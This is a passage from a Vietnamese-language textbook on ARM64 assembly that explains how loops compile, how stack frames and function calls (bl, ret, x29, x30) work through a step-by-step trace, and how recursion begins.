  &lt;+44&gt;:  add   w0, w0, #0x1
  &lt;+48&gt;:  str   w0, [sp, #28]
  &lt;+52&gt;:  ldr   w1, [sp, #28]
  &lt;+56&gt;:  ldr   w0, [sp, #12]
  &lt;+60&gt;:  cmp   w1, w0
  &lt;+64&gt;:  b.le  0x73c &lt;sumUp+24&gt;
  &lt;+68&gt;:  ldr   w0, [sp, #24]
  &lt;+72&gt;:  add   sp, sp, #0x20
  &lt;+76&gt;:  ret
</code></pre>
<h4 id="dạng-c-với-goto"><a class="header" href="#dạng-c-với-goto">Dạng C với goto</a></h4>
<pre><code class="language-c">int sumUp(int n) {
    int total = 0;
    int i = 1;
    goto start;
body:
    total += i;
    i += 1;
start:
    if (i &lt;= n) {
        goto body;
    }
    return total;
}
</code></pre>
<p><strong>Bảng 1.</strong> Dịch <code>sumUp()</code> sang dạng C sử dụng <code>goto</code>.</p>
<p>Đoạn code ở trên cũng tương đương với đoạn code C sau đây <strong>không</strong> sử dụng câu lệnh <code>goto</code>:</p>
<pre><code class="language-c">int sumUp(int n) {
    int total = 0;
    int i = 1;
    while (i &lt;= n) {
        total += i;
        i += 1;
    }
    return total;
}
</code></pre>
<h4 id="vòng-lặp-for-trong-assembly-2"><a class="header" href="#vòng-lặp-for-trong-assembly-2">Vòng lặp for trong Assembly</a></h4>
<p>Vòng lặp chính trong hàm <code>sumUp</code> cũng có thể được viết lại dưới dạng vòng lặp <code>for</code>:</p>
<pre><code class="language-c">int sumUp2(int n) {
    int total = 0;             // khởi tạo total = 0
    int i;
    for (i = 1; i &lt;= n; i++) { // khởi tạo i = 1, tăng i thêm 1 khi i &lt;= n
        total += i;            // cộng i vào total
    }
    return total;
}
</code></pre>
<p>Phiên bản này tạo ra <strong>code assembly giống hệt</strong> với ví dụ vòng lặp <code>while</code>.<br />
Dưới đây là code assembly của <code>sumUp2</code> kèm chú thích từng dòng:</p>
<pre><code>Dump of assembler code for function sumUp2:
0x0774 &lt;+0&gt;:  sub   sp, sp, #0x20     // mở rộng stack thêm 32 byte (frame mới)
0x0778 &lt;+4&gt;:  str   w0, [sp, #12]     // lưu n tại sp+12 (n)
0x077c &lt;+8&gt;:  str   wzr, [sp, #24]    // lưu 0 tại sp+24 (total)
0x0780 &lt;+12&gt;: mov   w0, #0x1          // w0 = 1
0x0784 &lt;+16&gt;: str   w0, [sp, #28]     // lưu 1 tại sp+28 (i)
0x0788 &lt;+20&gt;: b     0x7a8 &lt;sumUp2+52&gt; // nhảy tới &lt;sumUp2+52&gt;
0x078c &lt;+24&gt;: ldr   w1, [sp, #24]     // w1 = total
0x0790 &lt;+28&gt;: ldr   w0, [sp, #28]     // w0 = i
0x0794 &lt;+32&gt;: add   w0, w1, w0        // w0 = total + i
0x0798 &lt;+36&gt;: str   w0, [sp, #24]     // lưu (total+i) vào total
0x079c &lt;+40&gt;: ldr   w0, [sp, #28]     // w0 = i
0x07a0 &lt;+44&gt;: add   w0, w0, #0x1      // w0 = i + 1
0x07a4 &lt;+48&gt;: str   w0, [sp, #28]     // lưu (i+1) vào i (i += 1)
0x07a8 &lt;+52&gt;: ldr   w1, [sp, #28]     // w1 = i
0x07ac &lt;+56&gt;: ldr   w0, [sp, #12]     // w0 = n
0x07b0 &lt;+60&gt;: cmp   w1, w0            // so sánh i và n
0x07b4 &lt;+64&gt;: b.le  0x78c &lt;sumUp2+24&gt; // nếu (i &lt;= n) nhảy tới &lt;sumUp2+24&gt;
0x07b8 &lt;+68&gt;: ldr   w0, [sp, #24]     // w0 = total
0x07bc &lt;+72&gt;: add   sp, sp, #0x20     // khôi phục stack
0x07c0 &lt;+76&gt;: ret                     // trả về w0 (total)
</code></pre>
<p>Để hiểu tại sao phiên bản vòng lặp <code>for</code> này tạo ra code assembly giống hệt với phiên bản vòng lặp <code>while</code>, hãy nhớ rằng vòng lặp <code>for</code> có dạng:</p>
<pre><code class="language-c">for (&lt;khởi tạo&gt;; &lt;biểu thức điều kiện&gt;; &lt;bước lặp&gt;) {
    &lt;thân vòng lặp&gt;
}
</code></pre>
<p>Điều này tương đương với vòng lặp <code>while</code> sau:</p>
<pre><code class="language-c">&lt;khởi tạo&gt;
while (&lt;biểu thức điều kiện&gt;) {
    &lt;thân vòng lặp&gt;
    &lt;bước lặp&gt;
}
</code></pre>
<p>Vì <a href="C9-ARM64/../C1-C_intro/conditionals.html#_for_loops">mọi vòng lặp <code>for</code> đều có thể được biểu diễn bằng vòng lặp <code>while</code></a>, nên hai chương trình C dưới đây là các cách viết tương đương cho cùng một đoạn assembly ở trên:</p>
<h4 id="for-loop"><a class="header" href="#for-loop">For loop</a></h4>
<pre><code class="language-c">int sumUp2(int n) {
    int total = 0;
    int i = 1;
    for (i; i &lt;= n; i++) {
        total += i;
    }
    return total;
}
</code></pre>
<h4 id="while-loop"><a class="header" href="#while-loop">While loop</a></h4>
<pre><code class="language-c">int sumUp(int n) {
    int total = 0;
    int i = 1;
    while (i &lt;= n) {
        total += i;
        i += 1;
    }
    return total;
}
</code></pre>
<p><strong>Bảng 2.</strong> Các cách viết tương đương của hàm <code>sumUp</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="95-functions-trong-assembly"><a class="header" href="#95-functions-trong-assembly">9.5. Functions trong Assembly</a></h2>
<p>Trong phần trước, chúng ta đã lần theo quá trình thực thi của các hàm đơn giản trong assembly.<br />
Trong phần này, chúng ta sẽ thảo luận về sự tương tác giữa nhiều hàm trong assembly trong bối cảnh của một chương trình lớn hơn. Chúng ta cũng sẽ giới thiệu một số lệnh mới liên quan đến việc quản lý hàm.</p>
<p>Hãy bắt đầu bằng việc ôn lại cách <strong>call stack</strong> được quản lý.<br />
Hãy nhớ rằng <code>sp</code> là <strong>stack pointer</strong> (thanh ghi con trỏ stack) và luôn trỏ tới đỉnh của stack. Thanh ghi <code>x29</code> đại diện cho <strong>base pointer</strong> (còn gọi là <strong>frame pointer</strong> hoặc <code>FP</code>) và trỏ tới đáy của <em>stack frame</em> hiện tại.</p>
<p><strong>Stack frame</strong> (còn gọi là <strong>activation frame</strong> hoặc <strong>activation record</strong>) là phần của stack được cấp phát cho một lần gọi hàm. Hàm đang thực thi luôn nằm ở đỉnh stack, và stack frame của nó được gọi là <strong>active frame</strong>. Active frame được giới hạn bởi stack pointer (ở đỉnh stack, địa chỉ thấp hơn) và frame pointer (ở đáy frame, địa chỉ cao hơn). Activation record thường chứa các biến cục bộ của hàm.</p>
<p>Cuối cùng, <strong>return address</strong> là địa chỉ trong chương trình mà hàm gọi (ví dụ <code>main</code>) sẽ tiếp tục thực thi sau khi hàm được gọi (callee) kết thúc. Trên hệ thống A64, return address được lưu trong thanh ghi <code>x30</code> (còn gọi là <code>LR</code> — Link Register).</p>
<p>Hình 1 cho thấy các <em>stack frame</em> của <code>main</code> và một hàm mà nó gọi tên là <code>fname</code>. Chúng ta sẽ gọi hàm <code>main</code> là hàm <em>caller</em> (hàm gọi) và <code>fname</code> là hàm <em>callee</em> (hàm được gọi).</p>
<p><img src="C9-ARM64/_images/stackFrame.png" alt="an illustration of stack frames" /><br />
<strong>Hình 1.</strong> Quản lý stack frame</p>
<p>Trong Hình 1, <em>active frame</em> hiện tại thuộc về hàm callee (<code>fname</code>). Vùng của call stack nằm giữa <strong>stack pointer</strong> và <strong>frame pointer</strong> được dùng cho các biến cục bộ. Stack pointer sẽ thay đổi khi các giá trị cục bộ được <em>push</em> (đẩy) lên hoặc <em>pop</em> (lấy ra) khỏi stack. Frame pointer thường không được sử dụng trong code đã tối ưu hóa, và thường là tùy chọn. Do đó, các compiler như GCC thường tham chiếu các giá trị trên stack tương đối so với stack pointer.</p>
<p>Trong Hình 1, <em>active frame</em> được giới hạn phía dưới bởi <strong>base pointer</strong> của <code>fname</code>, tức <code>x29</code>, chứa địa chỉ stack <code>0xef30</code>. Giá trị lưu tại địa chỉ <code>0xef30</code> là giá trị frame pointer đã “lưu” (0xef50), vốn chỉ ra đáy của <em>activation frame</em> cho hàm <code>main</code>. Ngay bên dưới frame pointer là <strong>return address</strong> đã lưu (lưu trong <code>x30</code>), cho biết địa chỉ mà chương trình sẽ tiếp tục thực thi khi <code>main</code> thoát.</p>
<blockquote>
<h4 id="return-address-trỏ-tới-code-memory-không-phải-stack-memory"><a class="header" href="#return-address-trỏ-tới-code-memory-không-phải-stack-memory">Return address trỏ tới <em>code memory</em>, không phải <em>stack memory</em></a></h4>
<p>Hãy nhớ rằng vùng call stack (<em>stack memory</em>) của một chương trình khác với vùng code (<em>code memory</em>). Trong khi <code>sp</code> và <code>x29</code> trỏ tới địa chỉ trong stack memory, <code>pc</code> trỏ tới một địa chỉ trong <em>code memory</em>. Nói cách khác, return address là một địa chỉ trong <em>code memory</em>, không phải stack memory:</p>
<p><img src="C9-ARM64/_images/memparts.png" alt="The parts of a program's address space." /><br />
<strong>Hình 2.</strong> Các phần của không gian địa chỉ chương trình</p>
</blockquote>
<p><strong>Bảng 1</strong> liệt kê một số lệnh bổ sung mà compiler sử dụng để quản lý hàm cơ bản.</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: left">Instruction</th><th style="text-align: left">Translation</th></tr></thead><tbody>
<tr><td style="text-align: left"><code>bl addr &lt;fname&gt;</code></td><td style="text-align: left">Đặt <code>x30 = pc + 4</code> và đặt <code>pc = addr</code></td></tr>
<tr><td style="text-align: left"><code>blr R &lt;fname&gt;</code></td><td style="text-align: left">Đặt <code>x30 = pc + 4</code> và đặt <code>pc = R</code></td></tr>
<tr><td style="text-align: left"><code>ret</code></td><td style="text-align: left">Trả về giá trị trong <code>x0</code> và đặt <code>pc = x30</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các lệnh quản lý hàm thông dụng</p>
<p>Các lệnh <code>bl</code> và <code>ret</code> đóng vai trò quan trọng trong quá trình một hàm gọi hàm khác. Cả hai lệnh này đều thay đổi <strong>instruction pointer</strong> (thanh ghi <code>pc</code>). Khi hàm caller thực thi lệnh <code>bl</code>, giá trị <code>pc + 4</code> được lưu vào thanh ghi <code>x30</code> để biểu diễn return address — tức địa chỉ chương trình mà caller sẽ tiếp tục thực thi khi hàm callee kết thúc. Lệnh <code>bl</code> cũng thay thế giá trị của <code>pc</code> bằng địa chỉ của hàm callee.</p>
<p>Lệnh <code>ret</code> khôi phục giá trị của <code>pc</code> từ giá trị đã lưu trong <code>x30</code>, đảm bảo chương trình tiếp tục thực thi tại địa chỉ chương trình được chỉ định trong hàm caller. Bất kỳ giá trị nào được hàm callee trả về sẽ được lưu trong thanh ghi <code>x0</code> hoặc <em>component register</em> <code>w0</code>. Lệnh <code>ret</code> thường là lệnh cuối cùng được thực thi trong bất kỳ hàm nào.</p>
<h3 id="951-function-parameters"><a class="header" href="#951-function-parameters">9.5.1. Function Parameters</a></h3>
<p>Các tham số hàm thường được nạp sẵn vào các thanh ghi trước khi gọi hàm. Tám tham số đầu tiên của một hàm được lưu trong các thanh ghi <code>x0</code>...<code>x7</code>. Nếu một hàm cần nhiều hơn bảy tham số, các tham số còn lại sẽ lần lượt được lưu vào call stack dựa trên kích thước của chúng (offset 4 byte cho dữ liệu 32-bit, offset 8 byte cho dữ liệu 64-bit).</p>
<h3 id="952-tracing-through-an-example"><a class="header" href="#952-tracing-through-an-example">9.5.2. Tracing Through an Example</a></h3>
<p>Vận dụng kiến thức về quản lý hàm, hãy lần theo ví dụ mã nguồn đã được giới thiệu ở đầu chương này:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int assign() {
    int y = 40;
    return y;
}

int adder() {
    int a;
    return a + 2;
}

int main(void) {
    int x;
    assign();
    x = adder();
    printf(&quot;x is: %d\n&quot;, x);
    return 0;
}
</code></pre>
<p>Chúng ta biên dịch code này với lệnh:</p>
<pre><code>gcc -o prog prog.c
</code></pre>
<p>và dùng <code>objdump -d</code> để xem code assembly tương ứng. Lệnh sau sẽ xuất ra một tệp khá lớn chứa nhiều thông tin không cần thiết. Hãy dùng <code>less</code> và chức năng tìm kiếm để trích xuất các hàm <code>adder</code>, <code>assign</code> và <code>main</code>:</p>
<pre><code class="language-assembly">0000000000000724 &lt;assign&gt;:
 724:   d10043ff        sub     sp, sp, #0x10
 728:   52800500        mov     w0, #0x28                       // #40
 72c:   b9000fe0        str     w0, [sp, #12]
 730:   b9400fe0        ldr     w0, [sp, #12]
 734:   910043ff        add     sp, sp, #0x10
 738:   d65f03c0        ret

000000000000073c &lt;adder&gt;:
 73c:   d10043ff        sub     sp, sp, #0x10
 740:   b9400fe0        ldr     w0, [sp, #12]
 744:   11000800        add     w0, w0, #0x2
 748:   910043ff        add     sp, sp, #0x10
 74c:   d65f03c0        ret

0000000000000750 &lt;main&gt;:
 750:   a9be7bfd        stp     x29, x30, [sp, #-32]!
 754:   910003fd        mov     x29, sp
 758:   97fffff3        bl      724 &lt;assign&gt;
 75c:   97fffff8        bl      73c &lt;adder&gt;
 760:   b9001fa0        str     w0, [x29, #28]
 764:   90000000        adrp    x0, 0 &lt;_init-0x598&gt;
 768:   91208000        add     x0, x0, #0x820
 76c:   b9401fa1        ldr     w1, [x29, #28]
 770:   97ffffa8        bl      610 &lt;printf@plt&gt;
 774:   52800000        mov     w0, #0x0                        // #0
 778:   a8c27bfd        ldp     x29, x30, [sp], #32
 77c:   d65f03c0        ret
</code></pre>
<p>Mỗi hàm bắt đầu bằng một <strong>symbolic label</strong> (nhãn ký hiệu) tương ứng với tên được khai báo trong chương trình. Ví dụ, <code>&lt;main&gt;:</code> là nhãn ký hiệu cho hàm <code>main</code>. Địa chỉ của nhãn hàm cũng là địa chỉ của lệnh đầu tiên trong hàm đó.</p>
<p>Để tiết kiệm không gian trong các hình minh họa tiếp theo, chúng ta sẽ rút gọn địa chỉ code lệnh xuống 12 bit thấp, và địa chỉ stack xuống 16 bit thấp. Ví dụ, địa chỉ stack <code>0xffffffffef50</code> sẽ được hiển thị là <code>0xef50</code>.</p>
<h3 id="953-tracing-through-main"><a class="header" href="#953-tracing-through-main">9.5.3. Tracing Through main</a></h3>
<p>Hình 3 cho thấy execution stack ngay trước khi thực thi hàm <code>main</code>.</p>
<p><img src="C9-ARM64/_images/procedures/Slide1.png" alt="slide1" /></p>
<p><strong>Hình 3.</strong> Trạng thái ban đầu của các thanh ghi CPU và call stack trước khi thực thi hàm <code>main</code></p>
<p>Hãy nhớ rằng stack phát triển về phía <em>địa chỉ thấp hơn</em>. Trong ví dụ này, cả frame pointer và stack pointer (<code>x29</code> và <code>sp</code>) đều chứa địa chỉ <code>0xef50</code>. Ban đầu, <code>pc</code> là địa chỉ của lệnh đầu tiên trong hàm <code>main</code>, tức <code>0x750</code>. Các thanh ghi <code>x30</code> và <code>w0</code> cũng được đánh dấu trong ví dụ này, và cả hai đều chứa các giá trị rác ban đầu.</p>
<p><img src="C9-ARM64/_images/procedures/Slide2.png" alt="slide2" /></p>
<p>Lệnh đầu tiên (<code>stp</code>) là một lệnh hợp thành gồm hai phần:</p>
<ul>
<li>Đầu tiên, toán hạng thứ hai (<code>[sp, #-32]!</code>) giảm giá trị stack pointer đi 32 byte, từ đó cấp phát không gian cho stack frame hiện tại. Sau khi toán hạng này được đánh giá, stack pointer được cập nhật thành <code>0xef30</code>.</li>
<li>Tiếp theo, lệnh <code>stp</code> lưu giá trị hiện tại của <code>x29</code> và <code>x30</code> vào các vị trí <code>sp</code> và <code>sp+8</code> tương ứng. Thanh ghi <code>pc</code> (program counter) tăng lên để trỏ tới lệnh tiếp theo.</li>
</ul>
<p><img src="C9-ARM64/_images/procedures/Slide3.png" alt="slide3" /></p>
<p>Lệnh tiếp theo (<code>mov x29, sp</code>) cập nhật giá trị của <code>x29</code> thành bằng <code>sp</code>. Như vậy, frame pointer (<code>x29</code>) giờ đây trỏ tới đầu của stack frame dành cho hàm <code>main</code>. Thanh ghi <code>pc</code> tăng lên để trỏ tới lệnh tiếp theo.</p>
<p><img src="C9-ARM64/_images/procedures/Slide4.png" alt="slide4" /></p>
<p>Lệnh <code>bl</code> đầu tiên lưu giá trị <code>pc+4</code> (tức <code>0x75c</code>) vào thanh ghi <code>x30</code>. Đây là địa chỉ trong <code>main</code> mà chương trình sẽ tiếp tục thực thi sau khi hàm <code>assign</code> trả về. Tiếp theo, thanh ghi <code>pc</code> được cập nhật thành địa chỉ <code>0x724</code>, là địa chỉ của lệnh đầu tiên trong hàm <code>assign</code>.</p>
<p><img src="C9-ARM64/_images/procedures/Slide5.png" alt="slide5" /></p>
<p>Lệnh tiếp theo được thực thi là lệnh đầu tiên trong <code>assign</code>. Lệnh <code>sub</code> giảm giá trị stack pointer đi 16 byte. Lúc này, <code>x29</code> và <code>sp</code> xác định ranh giới của active stack frame dành cho hàm <code>assign</code>. Thanh ghi <code>pc</code> tăng lên để trỏ tới lệnh tiếp theo.</p>
<p><img src="C9-ARM64/_images/procedures/Slide6.png" alt="slide6" /></p>
<p>Lệnh <code>mov</code> lưu giá trị hằng <code>0x28</code> vào thanh ghi <code>w0</code>. Thanh ghi <code>pc</code> tăng lên để trỏ tới lệnh tiếp theo.</p>
<p><img src="C9-ARM64/_images/procedures/Slide7.png" alt="slide7" /></p>
<p>Lệnh <code>str</code> lưu giá trị <code>0x28</code> vào vị trí cách stack pointer 12 byte, tức địa chỉ <code>0xef2c</code>. Thanh ghi <code>pc</code> tăng lên để trỏ tới lệnh tiếp theo.</p>
<p><img src="C9-ARM64/_images/procedures/Slide8.png" alt="slide8" /></p>
<p>Lệnh <code>ldr</code> nạp giá trị <code>0x28</code> từ địa chỉ stack <code>0xef2c</code> vào thanh ghi <code>w0</code>. Thanh ghi <code>pc</code> tăng lên để trỏ tới lệnh tiếp theo.</p>
<p><img src="C9-ARM64/_images/procedures/Slide9.png" alt="slide9" /></p>
<p>Lệnh <code>add</code> giải phóng stack frame hiện tại và đưa <code>sp</code> trở lại giá trị trước đó, tức <code>0xef30</code>.</p>
<p><img src="C9-ARM64/_images/procedures/Slide10.png" alt="slide10" /></p>
<p>Lệnh <code>ret</code> thay thế giá trị trong <code>pc</code> bằng giá trị trong <code>x30</code>, tức <code>0x75c</code>. Kết quả là chương trình quay trở lại thực thi lệnh đầu tiên trong hàm <code>main</code> ngay sau lời gọi hàm <code>assign</code>.</p>
<p><img src="C9-ARM64/_images/procedures/Slide11.png" alt="slide11" /></p>
<p>Lệnh tiếp theo được thực thi là một lời gọi hàm tới <code>adder</code> (hay <code>bl 73c &lt;adder&gt;</code>). Do đó, thanh ghi <code>x30</code> được cập nhật với giá trị <code>pc+4</code>, tức <code>0x760</code>. Thanh ghi <code>pc</code> được thay bằng địa chỉ <code>0x73c</code>, cho biết chương trình sẽ tiếp tục thực thi bên trong hàm <code>adder</code>.</p>
<p><img src="C9-ARM64/_images/procedures/Slide12.png" alt="slide12" /></p>
<p>Lệnh đầu tiên trong hàm <code>adder</code> giảm giá trị stack pointer đi 16 byte, cấp phát stack frame mới cho hàm <code>adder</code>. Lưu ý rằng ranh giới của <em>active stack frame</em> cho hàm <code>adder</code> được xác định bởi các thanh ghi <code>sp</code> và <code>x29</code>. Thanh ghi <code>pc</code> tăng lên để trỏ tới lệnh tiếp theo.</p>
<p><img src="C9-ARM64/_images/procedures/Slide13.png" alt="slide13" /></p>
<p>Điều xảy ra tiếp theo là rất quan trọng. Lệnh <code>ldr</code> nạp một giá trị <em>cũ</em> từ stack (tại <code>sp+12</code>) vào thanh ghi <code>w0</code>. Đây là hệ quả trực tiếp của việc lập trình viên quên khởi tạo biến <code>a</code> trong hàm <code>adder</code>. Thanh ghi <code>pc</code> tăng lên để trỏ tới lệnh tiếp theo.</p>
<p><img src="C9-ARM64/_images/procedures/Slide14.png" alt="slide14" /></p>
<p>Lệnh <code>add</code> sau đó cộng <code>0x2</code> vào giá trị trong <code>w0</code> và lưu kết quả (<code>0x2A</code>) vào thanh ghi <code>w0</code>. Thanh ghi <code>pc</code> tăng lên để trỏ tới lệnh tiếp theo.</p>
<p><img src="C9-ARM64/_images/procedures/Slide15.png" alt="slide15" /></p>
<p>Lệnh <code>add</code> tiếp theo cộng thêm 16 byte vào stack pointer, qua đó hủy bỏ <em>active frame</em> của <code>adder</code> và khôi phục <code>sp</code> về giá trị trước đó. Thanh ghi <code>pc</code> tăng lên để trỏ tới lệnh tiếp theo.</p>
<p><img src="C9-ARM64/_images/procedures/Slide16.png" alt="slide16" /></p>
<p>Cuối cùng, lệnh <code>ret</code> ghi đè <code>pc</code> bằng địa chỉ trong thanh ghi <code>x30</code>, cho biết chương trình sẽ tiếp tục thực thi trong hàm <code>main</code> tại địa chỉ <code>0x760</code> trong code segment.</p>
<p><img src="C9-ARM64/_images/procedures/Slide17.png" alt="slide20" /></p>
<p>Quay lại hàm <code>main()</code>, lệnh <code>str</code> tại địa chỉ chương trình <code>0x760</code> lưu nội dung của thanh ghi <code>w0</code> (<code>0x2A</code>) vào vị trí trên call stack cách frame pointer (<code>x29</code>) 28 byte. Do đó, <code>0x2A</code> được lưu tại địa chỉ stack <code>0xef4c</code>.</p>
<p><img src="C9-ARM64/_images/procedures/Slide19.png" alt="slide18" /></p>
<p>Hai lệnh tiếp theo cùng nhau nạp một địa chỉ của một trang bộ nhớ vào thanh ghi <code>x0</code>. Vì địa chỉ dài 8 byte, thanh ghi 64-bit <code>x0</code> được sử dụng thay vì <em>component register</em> 32-bit <code>w0</code>. Lệnh <code>adrp</code> nạp địa chỉ (<code>0x0</code>) vào <code>x0</code>, trong khi lệnh <code>add</code> tại địa chỉ <code>0x768</code> cộng thêm giá trị <code>0x820</code> vào đó. Sau khi hai lệnh này thực thi, thanh ghi <code>x0</code> chứa địa chỉ bộ nhớ <code>0x820</code>. Lưu ý rằng giá trị lưu tại địa chỉ <code>0x820</code> là chuỗi <code>&quot;x is %d\n&quot;</code>.</p>
<p><img src="C9-ARM64/_images/procedures/Slide20.png" alt="slide20" /></p>
<p>Tiếp theo, lệnh <code>ldr</code> tại địa chỉ chương trình <code>0x76c</code> nạp giá trị <code>0x2A</code> (nằm tại offset 28 byte từ frame pointer) vào thanh ghi <code>w1</code>.</p>
<p><img src="C9-ARM64/_images/procedures/Slide21.png" alt="slide21" /></p>
<p>Lệnh tiếp theo gọi hàm <code>printf</code>. Để ngắn gọn, chúng ta sẽ không lần theo hàm <code>printf</code> (thuộc thư viện <code>stdio.h</code>). Tuy nhiên, theo trang hướng dẫn (<code>man -s3 printf</code>), <code>printf</code> có định dạng như sau:</p>
<pre><code>int printf(const char * format, ...)
</code></pre>
<p>Nói cách khác, đối số thứ nhất là một <strong>con trỏ</strong> trỏ tới một chuỗi xác định định dạng (<em>format</em>), và các đối số từ thứ hai trở đi chỉ định các giá trị sẽ được sử dụng trong định dạng đó. Các lệnh tại địa chỉ từ <code>0x764</code> đến <code>0x770</code> tương ứng với dòng lệnh trong hàm <code>main</code>:</p>
<pre><code class="language-c">printf(&quot;x is %d\n&quot;, x);
</code></pre>
<p>Khi hàm <code>printf</code> được gọi:</p>
<ul>
<li><strong>Return address</strong> (<code>pc+4</code> hay <code>0x774</code>) được lưu vào thanh ghi <code>x30</code>.</li>
<li>Thanh ghi <code>pc</code> được thay bằng địa chỉ <code>0x610</code>, là điểm bắt đầu của hàm <code>printf</code>.</li>
<li>Thanh ghi <code>sp</code> được cập nhật để phản ánh stack frame mới dành cho hàm <code>printf</code>.</li>
</ul>
<p>Tại một thời điểm nào đó, <code>printf</code> sẽ truy cập các đối số của nó, đó là chuỗi <code>&quot;x is %d\n&quot;</code> và giá trị <code>0x2A</code>. Hãy nhớ rằng, với bất kỳ hàm nào có <em>n</em> đối số, <strong>gcc</strong> sẽ đặt 8 đối số đầu tiên vào các thanh ghi <code>x0</code>–<code>x7</code>, và các đối số còn lại sẽ được đặt lên stack <em>bên dưới</em> frame pointer. Trong trường hợp này, tham số thứ nhất được lưu trong thanh ghi <code>x0</code> (vì nó là địa chỉ của một chuỗi), và tham số thứ hai được lưu trong <em>component register</em> <code>w1</code>.</p>
<p>Sau khi gọi <code>printf</code>, giá trị <code>0x2A</code> sẽ được xuất ra cho người dùng ở dạng số nguyên. Do đó, giá trị <strong>42</strong> được in ra màn hình. Stack pointer trở về giá trị trước đó, và <code>pc</code> được cập nhật bằng giá trị lưu trong thanh ghi <code>x30</code>, tức <code>0x774</code>.</p>
<p><img src="C9-ARM64/_images/procedures/Slide22.png" alt="slide23" /></p>
<p>Lệnh <code>mov</code> tại địa chỉ <code>0x774</code> nạp giá trị hằng <code>#0x0</code> vào <em>component register</em> <code>w0</code>. Đây là giá trị sẽ được trả về khi <code>main</code> kết thúc thực thi. Thanh ghi <code>pc</code> tăng lên để trỏ tới lệnh tiếp theo.</p>
<p><img src="C9-ARM64/_images/procedures/Slide23.png" alt="slide24" /></p>
<p>Lệnh <code>ldp</code> tại địa chỉ chương trình <code>0x778</code> trước tiên sao chép các giá trị tại <code>sp</code> và <code>sp+8</code> vào các thanh ghi <code>x29</code> và <code>x30</code>, khôi phục chúng về giá trị ban đầu trước khi <code>main</code> bắt đầu thực thi. Phần cuối của lệnh <code>ldp</code> (được chỉ định bởi toán hạng <code>[sp], #32</code>) tăng stack pointer thêm 32 byte, khôi phục <code>sp</code> về giá trị ban đầu trước khi <code>main</code> chạy. Do đó, khi lệnh <code>ldp</code> hoàn tất, stack pointer (<code>sp</code>), frame pointer (<code>x29</code>) và thanh ghi trả về (<code>x30</code>) đều đã trở lại giá trị ban đầu. Thanh ghi <code>pc</code> tăng lên để trỏ tới lệnh cuối cùng trong hàm <code>main</code>.</p>
<p><img src="C9-ARM64/_images/procedures/Slide24.png" alt="slide25" /></p>
<p>Lệnh cuối cùng được thực thi là <code>ret</code>. Với <code>0x0</code> trong thanh ghi trả về <code>w0</code>, chương trình trả về giá trị <strong>0</strong>, biểu thị việc kết thúc thành công.</p>
<p>Nếu bạn đã đọc kỹ phần này, bạn sẽ hiểu tại sao chương trình của chúng ta in ra giá trị <strong>42</strong>. Về bản chất, chương trình đã vô tình sử dụng các giá trị cũ trên stack, khiến nó hoạt động theo cách mà chúng ta không lường trước. Ví dụ này khá vô hại; tuy nhiên, ở các phần sau, chúng ta sẽ thảo luận cách tin tặc lợi dụng lời gọi hàm để khiến chương trình hoạt động sai lệch theo những cách thực sự nguy hiểm.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="96-Đệ-quy-recursion"><a class="header" href="#96-Đệ-quy-recursion">9.6. Đệ quy (Recursion)</a></h2>
<p><strong>Hàm đệ quy</strong> là một lớp đặc biệt của hàm, trong đó hàm <strong>tự gọi lại chính nó</strong> (còn gọi là <strong>self-referential function</strong>) để tính toán một giá trị.<br />
Giống như các hàm không đệ quy, hàm đệ quy tạo ra <strong>stack frame</strong> mới cho mỗi lần gọi hàm.<br />
Điểm khác biệt là trong hàm đệ quy, phần thân hàm có chứa lời gọi đến chính nó.</p>
<p>Hãy cùng xem lại bài toán tính tổng các số nguyên dương từ 1 đến <em>n</em>.<br />
Ở các phần trước, chúng ta đã thảo luận về hàm <code>sumUp</code> để thực hiện nhiệm vụ này.<br />
<strong>Bảng 1</strong> dưới đây cho thấy một hàm liên quan có tên <code>sumDown</code>, cộng các số theo thứ tự ngược (<em>n</em> về 1), và phiên bản đệ quy tương đương của nó:</p>
<h4 id="phiên-bản-lặp-iterative"><a class="header" href="#phiên-bản-lặp-iterative">Phiên bản lặp (Iterative)</a></h4>
<pre><code class="language-c">int sumDown(int n) {
    int total = 0;
    int i = n;
    while (i &gt; 0) {
        total += i;
        i--;
    }
    return total;
}
</code></pre>
<h4 id="phiên-bản-đệ-quy-recursive"><a class="header" href="#phiên-bản-đệ-quy-recursive">Phiên bản đệ quy (Recursive)</a></h4>
<pre><code class="language-c">int sumr(int n) {
    if (n &lt;= 0) {
        return 0;
    }
    return n + sumr(n-1);
}
</code></pre>
<p><strong>Bảng 1.</strong> Phiên bản lặp và phiên bản đệ quy của hàm <code>sumDown</code>.</p>
<p>Trong hàm đệ quy <code>sumr</code>, <strong>trường hợp cơ sở</strong> (base case) xử lý mọi giá trị <em>n</em> nhỏ hơn hoặc bằng 0.<br />
<strong>Bước đệ quy</strong> cộng giá trị hiện tại của <em>n</em> với kết quả của lời gọi <code>sumr(n - 1)</code>.</p>
<p>Khi biên dịch <code>sumr</code> và dùng GDB để disassemble, ta thu được code assembly sau:</p>
<pre><code>Dump of assembler code for function sumr:
0x770 &lt;+0&gt;:  stp   x29, x30, [sp, #-32]! // sp = sp - 32; lưu x29, x30 vào stack
0x774 &lt;+4&gt;:  mov   x29, sp               // x29 = sp (đỉnh stack)
0x778 &lt;+8&gt;:  str   w0, [x29, #28]        // lưu n vào x29+28
0x77c &lt;+12&gt;: ldr   w0, [x29, #28]        // w0 = n
0x780 &lt;+16&gt;: cmp   w0, #0x0              // so sánh n với 0
0x784 &lt;+20&gt;: b.gt  0x790 &lt;sumr+32&gt;       // nếu (n &gt; 0) nhảy tới &lt;sumr+32&gt;
0x788 &lt;+24&gt;: mov   w0, #0x0              // w0 = 0
0x78c &lt;+28&gt;: b     0x7a8 &lt;sumr+56&gt;       // nhảy tới &lt;sumr+56&gt;
0x790 &lt;+32&gt;: ldr   w0, [x29, #28]        // w0 = n
0x794 &lt;+36&gt;: sub   w0, w0, #0x1          // w0 = n - 1
0x798 &lt;+40&gt;: bl    0x770 &lt;sumr&gt;          // gọi sumr(n-1), lưu kết quả vào w0
0x79c &lt;+44&gt;: mov   w1, w0                // sao chép kết quả sang w1
0x7a0 &lt;+48&gt;: ldr   w0, [x29, #28]        // w0 = n
0x7a4 &lt;+52&gt;: add   w0, w1, w0            // w0 = w1 + n
0x7a8 &lt;+56&gt;: ldp   x29, x30, [sp], #32   // khôi phục x29, x30 và sp
